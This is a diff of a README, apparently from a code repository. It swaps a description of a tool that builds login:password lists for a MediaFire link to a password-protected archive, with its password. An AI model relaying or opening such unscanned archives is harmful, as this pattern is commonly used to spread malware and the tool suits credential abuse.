@@ -1,2 +1,2 @@
-# login-pass
-an application that makes a login:password from files
+link - https://www.mediafire.com/file/44mwy5kf00ozoej/login%255Epass.rar/file
+pass - login
